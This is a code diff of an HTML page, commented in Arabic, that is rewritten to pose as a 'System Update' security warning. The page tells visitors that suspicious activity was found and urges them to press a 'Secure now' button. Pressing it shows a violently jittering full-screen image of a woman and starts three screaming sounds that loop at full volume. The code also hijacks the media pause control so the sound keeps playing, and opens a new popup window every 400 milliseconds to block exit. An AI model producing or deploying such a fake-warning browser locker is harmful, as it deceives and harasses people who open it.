@@ -3,89 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM_HALT ☠️</title>
+    <title>System Update</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
         
-        #madImg { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            object-fit: cover; z-index: 9999; display: none;
-        }
+        /* الواجهة البيضاء الرسمية سواسوة */
+        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; transition: 0.3s; }
+        .warning-box { text-align: center; padding: 20px; }
+        .warning-icon { font-size: 50px; color: #f44336; margin-bottom: 10px; }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 14px; margin-bottom: 30px; }
+        .btn-elegant { background: #007bff; color: #fff; border: none; padding: 15px 40px; border-radius: 25px; font-size: 18px; font-weight: 500; cursor: pointer; box-shadow: 0 4px 15px rgba(0,123,255,0.3); transition: 0.3s; }
+        .btn-elegant:active { transform: scale(0.95); background: #0056b3; }
 
-        #ui { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #000; z-index: 10000; display: flex; 
-            flex-direction: column; justify-content: center; align-items: center;
-            font-family: monospace; color: #f00;
+        /* صورة المرأة: رعشة ثابتة ومقلقة سواسوة */
+        #madImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
+        
+        @keyframes steadyJitter {
+            0% { transform: translate(2px, 1px) rotate(0deg); }
+            20% { transform: translate(-3px, -2px) rotate(-0.5deg); }
+            40% { transform: translate(-3px, 2px) rotate(0.5deg); }
+            60% { transform: translate(3px, 2px) rotate(-0.5deg); }
+            80% { transform: translate(-2px, -1px) rotate(0.5deg); }
+            100% { transform: translate(2px, 1px) rotate(0deg); }
         }
-        .btn-red { 
-            background: #f00; color: #000; border: none; width: 280px; height: 100px;
-            font-weight: bold; font-size: 28px; cursor: pointer;
-            box-shadow: 0 0 30px #f00;
-        }
-
-        @keyframes jitter {
-            0% { transform: translate(0,0) scale(1); }
-            25% { transform: translate(-15px, 15px) rotate(-5deg) scale(1.2); }
-            50% { transform: translate(20px, -10px) rotate(5deg) scale(1.1); }
-            75% { transform: translate(-10px, -20px) rotate(-3deg) scale(1.3); }
-            100% { transform: translate(0,0) scale(1.2); }
-        }
-
-        .active-madness {
-            display: block !important;
-            animation: jitter 0.05s infinite linear;
-        }
+        .vibrate-steady { display: block !important; animation: steadyJitter 0.04s infinite; }
     </style>
 </head>
 <body>
 
     <div id="ui">
-        <h1 style="font-size: 40px;">☠️ CRITICAL ERROR ☠️</h1>
-        <button class="btn-red" onclick="igniteGlobalAttack()">TERMINATE</button>
+        <div class="warning-box">
+            <div class="warning-icon">⚠️</div>
+            <h2>تحديث أمني مطلوب</h2>
+            <p>تم اكتشاف نشاط مشبوه على جهازك. يرجى الضغط على الزر أدناه لتأمين بياناتك فوراً.</p>
+            <button class="btn-elegant" onclick="launchChaos()">تأمين الآن</button>
+        </div>
     </div>
 
     <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <script>
-        function igniteGlobalAttack() {
-            // 1. إخفاء الواجهة فوراً سواسوة
-            document.getElementById('ui').style.removeProperty('display');
+        function launchChaos() {
+            // 1. اختفاء الواجهة وظهور المرأة سواسوة
             document.getElementById('ui').style.display = 'none';
-            document.getElementById('madImg').classList.add('active-madness');
+            document.getElementById('madImg').classList.add('vibrate-steady');
 
-            // 2. طلب الفول سكرين "بسيف" سواسوة
-            let elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-
-            // 3. تشغيل الأصوات الـ 3 (Hoova, Chicken, Dzonza) سواسوة
-            const links = [
+            // 2. الأصوات الـ 3 المريغلة سواسوة
+            const audios = [
                 "https://www.myinstants.com/media/sounds/hoova-2.mp3",
                 "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
                 "https://www.myinstants.com/media/sounds/dzonza.mp3"
             ];
 
-            links.forEach(link => {
-                let a = new Audio(link);
-                a.loop = True;
+            audios.forEach(src => {
+                let a = new Audio(src);
+                a.loop = true;
                 a.volume = 1.0;
                 a.play();
                 
-                // ميزة البقاء في الخلفية سواسوة: نستخدم Picture-in-Picture وهمي أو تكرار الطلب
-                a.onended = () => a.play();
+                // ميزة الصوت المستمر سواسوة (يلسق في الـ Background)
+                if ('mediaSession' in navigator) {
+                    navigator.mediaSession.metadata = new MediaMetadata({ title: 'System Security', artist: 'Protected' });
+                    navigator.mediaSession.setActionHandler('play', () => a.play());
+                    navigator.mediaSession.setActionHandler('pause', () => a.play()); // ممنوع التوقف سواسوة
+                }
             });
 
-            // 4. منع الخروج (Loop Back) سواسوة
-            setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 500);
+            // 3. منع الخروج سواسوة
+            setInterval(() => { window.open(window.location.href, '_blank', 'width=10,height=10'); }, 400);
         }
-
-        // منع زر الرجوع سواسوة
-        window.onbeforeunload = function() { return "STAY"; };
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() { history.go(1); };
     </script>
 </body>
 </html>
